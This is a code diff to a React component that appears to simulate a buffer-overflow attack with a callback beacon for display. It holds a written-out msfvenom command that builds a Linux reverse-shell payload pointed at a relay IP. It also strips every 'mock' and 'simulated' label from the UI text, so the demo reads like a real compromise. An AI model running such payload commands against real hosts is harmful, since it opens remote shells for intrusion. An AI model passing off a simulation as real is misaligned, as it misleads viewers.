@@ -14,7 +14,7 @@ const C2_IP = "10.13.37.5";
 const RELAY_IP = "172.20.44.9";
 
 const DISPLAY_OVERFLOW_COMMAND =
-  'msfvenom -p linux/x86/shell_reverse_tcp LHOST=203.0.113.25 LPORT=443 -b "\\x00\\x0a\\x0d" -f python';
+  'msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.20.44.9 LPORT=443 -b "\\x00\\x0a\\x0d" -f python';
 
 const OVERFLOW_COMMAND = DISPLAY_OVERFLOW_COMMAND.toLowerCase();
 
@@ -78,7 +78,7 @@ export default function SplitLayout() {
 
   const [targetInput, setTargetInput] = useState("");
   const [targetResponse, setTargetResponse] = useState(
-    "Awaiting mock package delivery."
+    "Awaiting package delivery."
   );
   const [serverLog, setServerLog] = useState<string[]>(makeInitialServerLog());
   const [lastObservedSource, setLastObservedSource] = useState("none");
@@ -106,7 +106,7 @@ export default function SplitLayout() {
     appendLines(
       {
         tone: "info",
-        text: `Starting mock scan against ${targetProfile.hostname}`,
+        text: `Starting scan against ${targetProfile.hostname}`,
       },
       {
         tone: "info",
@@ -164,11 +164,11 @@ export default function SplitLayout() {
     appendLines(
       {
         tone: "warning",
-        text: `[build] staged oversized demo package (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
+        text: `[build] staged payload (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
       },
       {
         tone: "warning",
-        text: "[build] copied input is intended to trigger overflow visualization only",
+        text: "[build] copied input is intended to trigger overflow",
       }
     );
   }
@@ -181,10 +181,10 @@ export default function SplitLayout() {
     setTransferDirection("outbound");
     setPacketVisible(true);
     setPacketStage("target");
-    setTargetResponse("Simulated callback in progress...");
+    setTargetResponse("Callback in progress...");
     appendLines({
       tone: "info",
-      text: `[callback] mock check-in initiated from ${targetProfile.hostname}`,
+      text: `[callback] check-in initiated from ${targetProfile.hostname}`,
     });
 
     if (routeMode === "relay") {
@@ -204,7 +204,7 @@ export default function SplitLayout() {
       setBeaconCount((prev) => prev + 1);
       appendLines({
         tone: "success",
-        text: `[c2] simulated beacon received from ${targetProfile.hostname}`,
+        text: `[c2] beacon received from ${targetProfile.hostname}`,
       });
     }, c2Delay);
 
@@ -216,7 +216,7 @@ export default function SplitLayout() {
       setPacketVisible(false);
       setPacketStage("idle");
       setTransferDirection("inbound");
-      setTargetResponse("Simulated compromise active. Callback loop armed.");
+      setTargetResponse("Compromise active. Callback loop armed.");
       beaconBusyRef.current = false;
     }, c2Delay + 1700);
   }
@@ -235,7 +235,7 @@ export default function SplitLayout() {
     if (!payloadName || !payloadPreview || !payloadWriteBuffer) {
       appendLines({
         tone: "warning",
-        text: `[send] no package staged — use "build package safe" or "${DISPLAY_OVERFLOW_COMMAND}"`,
+        text: `[send] no payload staged — use "build package safe" or "${DISPLAY_OVERFLOW_COMMAND}"`,
       });
       return;
     }
@@ -287,7 +287,7 @@ export default function SplitLayout() {
       if (payloadName === "safe") {
         setTargetCompromised(false);
         setBeaconEnabled(false);
-        setTargetResponse("200 OK — mock request parsed within reserved region.");
+        setTargetResponse("200 OK — request parsed within reserved region.");
         setServerLog([
           `request observed from ${simulatedSource}`,
           `request bytes on wire: ${payloadPreview.length}`,
@@ -308,13 +308,13 @@ export default function SplitLayout() {
       } else {
         setTargetCompromised(true);
         setBeaconEnabled(true);
-        setTargetResponse("Simulated compromise active. Callback loop armed.");
+        setTargetResponse("Compromise active. Callback loop armed.");
         setServerLog([
           `request observed from ${simulatedSource}`,
           `request bytes on wire: ${payloadPreview.length}`,
           `input bytes copied into buffer: ${payloadWriteBuffer.length}`,
           "reserved region exceeded in simulation view",
-          "mock compromise state entered",
+          "compromise state entered",
         ]);
         appendLines(
           {
@@ -323,11 +323,11 @@ export default function SplitLayout() {
           },
           {
             tone: "warning",
-            text: "[target] mock compromise state entered",
+            text: "[target] compromise state entered",
           },
           {
             tone: "info",
-            text: "[callback] simulated periodic check-in enabled",
+            text: "[callback] periodic check-in enabled",
           }
         );
       }
